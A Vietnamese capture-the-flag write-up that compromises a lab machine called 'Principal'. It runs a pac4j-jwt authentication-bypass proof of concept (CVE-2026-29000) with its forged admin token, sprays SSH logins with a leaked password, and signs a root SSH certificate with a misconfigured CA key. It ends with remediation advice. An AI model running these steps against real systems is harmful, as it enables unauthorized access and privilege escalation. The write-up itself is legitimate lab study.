


![[Pasted image 20261030011222.png]]

# Véc tơ tấn công

svc-deploy: Nmap -> web enumeration -> CVE-2026-29000 -> auth_token -> bypassed access -> password và user list -> crackmapexec bruteforce ssh -> svc-deploy credentials -> ssh
root: SSH misconfiguration trusted CA signature blindly -> ssh-key with CA signature -> root
# Enumeration with Nmap

```
# Nmap 7.95 scan initiated Fri Oct 30 00:34:45 2026 as: nmap -sC -sV -oN principal.nmap 10.129.244.220
Nmap scan report for 10.129.244.220
Host is up (0.046s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
|_http-server-header: Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Thu, 29 Oct 2026 17:33:36 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-10-29T17:33:36.738+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest: 
|     HTTP/1.1 302 Found
|     Date: Thu, 29 Oct 2026 17:33:36 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 29 Oct 2026 17:33:36 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch: 
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Thu, 29 Oct 2026 17:33:36 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5: 
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 29 Oct 2026 17:33:36 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=10/30%Time=6AE383BD%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Thu,\x2029\x20Oct\x
SF:202026\x2017:33:36\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j
SF:-jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConte
SF:nt-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nD
SF:ate:\x20Thu,\x2029\x20Oct\x202026\x2017:33:36\x20GMT\r\nServer:\x20Jett
SF:y\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r
SF:\nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220
SF:,"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20T
SF:hu,\x2029\x20Oct\x202026\x2017:33:36\x20GMT\r\nCache-Control:\x20must-r
SF:evalidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8
SF:859-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-eq
SF:uiv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<ti
SF:tle>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HT
SF:TP\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</t
SF:h><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr
SF:><th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>
SF:\n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found
SF:\r\nDate:\x20Thu,\x2029\x20Oct\x202026\x2017:33:36\x20GMT\r\nServer:\x2
SF:0Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-
SF:revalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r
SF:\n{\"timestamp\":\"2026-10-29T17:33:36\.738\+00:00\",\"status\":404,\"e
SF:rror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2eba
SF:k\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Thu
SF:,\x2029\x20Oct\x202026\x2017:33:36\x20GMT\r\nCache-Control:\x20must-rev
SF:alidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-885
SF:9-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equi
SF:v=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<titl
SF:e>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<b
SF:ody>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>
SF:\n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:<
SF:/th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x2
SF:0CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct 30 00:35:03 2026 -- 1 IP address (1 host up) scanned in 17.88 seconds
```


Nhận xét về host
- Cổng 22 đang mở ssh không làm gì cả
- cổng 8080 đang mở http: mục tiêu cần kiểm tra

Web Enumeration
![[Pasted image 20261030003903.png]]


Bạn có thể thấy rằng web đang chạy pac4j v1.2.0 và nó bị nhiễm lỗ hổng CVE-2026-29000 - pac4j-jwt AuthBypass https://github.com/alihussainzada/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc


```bash
(.venv) ┌─[gerryhtb@parrot]─[~/Desktop/lab/Principal/CVE-2026-29000-Python-PoC-pac4j-JWT-AuthenticationBypass-Poc]  
└──_ $python3 poc.py \  
--jwks http://10.129.244.220:8080/api/auth/jwks \  
--user admin \  
--role ROLE_ADMIN  
[*] Fetching JWKS...  
[+] Public key loaded  
[+] PlainJWT created  
  
=== Malicious JWE Token ===  
  
eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.kN6zf_wsceENkYhPZs3fkIOon  
uca0_CCW8e70MB3idTjEZeBh5f3UdmYxETWIi735KbpzOi1WlyvpRjeB_Y1KnmiR2H9_5trJ1oFoSKQfSxl-KTaU9_hlAWT97tur25yT2uHpDJKAlDFUU4wzFEVc7q  
-8heRW0tJtULddtZcMvTzc4Ebhchp7TQpiZso4Rg142t5Kbm2oFhdWX3iwSQ1Ntoe2cj_p0aw-FTgd0lD1ZkGZDk9RPFuH3c8WhRIxdVgWAC6nogyfXTGE-G9JkGpM  
hVyXW6-aAg_2_chCkM8MyCI5nMCngfYl_eByWpJU-jCHdkp4npbd9CvurauV0GAbg._loBHnoNQOXzB6xD.vNso55fJABCQ9Jc5dXfvKLFHo3Y_PPxFuJFkkOXjmFv  
6ga_HY__Vy_-6gWd-piXcahIO7VKa9uRhHdOYA8ORII7SDkEHAf9vMyXYLannOOvgyqAZ04yNeyjGaYCXNNSHK6JkD2SwV0UpyUBSTHOYZC7e2bysnO0v5w1LEJ7Y5  
RWxCValQ1ei3LxY94smGtcwTNdzmPw7VWJ_ITOhWNslqh9qqgHge0Gr0EcU9Zcy6uQi0QNRew.U0jQqxu2RWifeCX0UB_Irw  
  
Use it as:  
Authorization: Bearer eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.kN6  
zf_wsceENkYhPZs3fkIOonuca0_CCW8e70MB3idTjEZeBh5f3UdmYxETWIi735KbpzOi1WlyvpRjeB_Y1KnmiR2H9_5trJ1oFoSKQfSxl-KTaU9_hlAWT97tur25yT  
2uHpDJKAlDFUU4wzFEVc7q-8heRW0tJtULddtZcMvTzc4Ebhchp7TQpiZso4Rg142t5Kbm2oFhdWX3iwSQ1Ntoe2cj_p0aw-FTgd0lD1ZkGZDk9RPFuH3c8WhRIxdV  
gWAC6nogyfXTGE-G9JkGpMhVyXW6-aAg_2_chCkM8MyCI5nMCngfYl_eByWpJU-jCHdkp4npbd9CvurauV0GAbg._loBHnoNQOXzB6xD.vNso55fJABCQ9Jc5dXfvK  
LFHo3Y_PPxFuJFkkOXjmFv6ga_HY__Vy_-6gWd-piXcahIO7VKa9uRhHdOYA8ORII7SDkEHAf9vMyXYLannOOvgyqAZ04yNeyjGaYCXNNSHK6JkD2SwV0UpyUBSTHO  
YZC7e2bysnO0v5w1LEJ7Y5RWxCValQ1ei3LxY94smGtcwTNdzmPw7VWJ_ITOhWNslqh9qqgHge0Gr0EcU9Zcy6uQi0QNRew.U0jQqxu2RWifeCX0UB_Irw
```

sử dụng POC trên bạn có thể lấy được session-cookie của admin
![[Pasted image 20261030004748.png]]

dán vào và ta được vào với vai trò admin
![[Pasted image 20261030004814.png]]
chúng ta thấy tên các user tiềm năng

![[Pasted image 20261030004843.png]]
chúng ta cũng thấy password trông cũng rất tiềm năng


=> brute force thôi

```bash
nxc ssh 10.129.244.220 -u user.txt -p 'D3pl0y_$$H_Now42!'
```

![[Pasted image 20261030005239.png]]

# shell as svc-deploy

ừ chúng ta đã có credentials trên svc-deploy

![[Pasted image 20261030005451.png]]


# shell as root
![[Pasted image 20261030005554.png]]
chúng ta thuộc nhóm deployers

![[Pasted image 20261030005659.png]]
chúng ta có  CA trusted và nó cũng mention về deploy.sh

![[Pasted image 20261030005925.png]]

bạn có thể thấy rằng config của ssh đang trust các user có CA keys. Tức nghĩa nếu ai có private key được tạo ra và ký bởi CA key thì sẽ lên được quyền root. Vì chúng ta đang thuộc nhóm deployers nên cũng có quyền ký CA lên root.
```
# tạo key pwn
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -t ed25519 -f /tmp/pwn -N ""  
Generating public/private ed25519 key pair.  
Your identification has been saved in /tmp/pwn  
Your public key has been saved in /tmp/pwn.pub  
The key fingerprint is:  
SHA256:6DdQ3E0K32dzR75beTpI5/HkbxiOsUVFRtCoxRmeUvE svc-deploy@principal  
The key's randomart image is:  
+--[ED25519 256]--+  
|        .   ..=X=|  
|       . + = o=*o|  
|        o + +o*.E|  
|       o    .+.o+|  
|      o S   ..oo+|  
|     . .   ..+o*+|  
|      . o   .*++o|  
|       . .  o o.o|  
|               ..|  
+----[SHA256]-----+ 
# lấy chữ ký của CA vào pwn.pub 
svc-deploy@principal:/opt/principal/ssh$ ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub  
Signed user key /tmp/pwn-cert.pub: id "pwn-root" serial 0 for root valid from 2026-10-29T18:00:00 to 2026-10-29T19:01:25
```


![[Pasted image 20261030010423.png]]
Ok bạn đã lên được quyền root và.... chỉ có vậy thôi.


# Remediation

- Thực hiện nâng cấp hệ thống, sử dụng cấu hình tường lửa và xác thực token
- Nâng cấp hệ thống dể được vá các lỗ hổng nghiêm trọng
- Không cho keys/credentials lên những nơi không cần thiết
- Cấu hình ssh chặt chẽ hơn, không được chỉ trusted blindly bởi 1 nguồn duy nhất.